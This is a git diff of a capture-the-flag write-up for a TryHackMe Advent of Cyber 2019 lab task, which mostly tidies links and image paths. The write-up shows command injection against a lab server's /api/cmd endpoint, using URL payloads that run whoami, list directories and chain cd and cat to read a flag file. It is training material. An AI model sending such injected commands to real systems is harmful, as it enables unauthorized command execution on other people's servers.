@@ -6,7 +6,7 @@
 
 > McSkidy actually found something interesting on the /api/cmd endpoint.
 
-> Check out the [supporting material](https://github.com/g33k4y/TryHackMe-AdventofCyber2019-Writeup/blob/master/task24/Christmas%20Command%20Injection.pdf) here.
+> Check out the [supporting material](./Christmas Command Injection) here.
 
 ## Question 1
 
@@ -24,18 +24,25 @@ Navigating to http://[ip]:3000/api/cmd, we will see error "Cannot GET /api/cmd/"
 However, as the supporting doc implies, there might be command injection available here
 
 we can try by inserting whoami:
+
 `http://[ip]:3000/api/cmd/whoami`
 
 straightaway we can see a json return of 'root\n', which means our command injection works successfully
 So now we need to find the right information by enumerating and finding the right file:
 
 `http://[ip]:3000/api/cmd/ls -la`
-![](./pic1.png)
+
+![](./res/pic1.png)
+
 `http://[ip]:3000/api/cmd/cd home&&ls -la`
-![](./pic2.png)
+
+![](./res/pic2.png)
+
 `http://[ip]:3000/api/cmd/cd home&&cd bestadmin&&ls -la`
-![](./pic3.png)
+
+![](./res/pic3.png)
 
 in the directory home/bestadmin/ we will find the user.txt file. Hence the below will give us the answer.
+
 `http://[ip]:3000/api/cmd/cd%20home&&cd%20bestadmin&&cat%20user.txt`
 
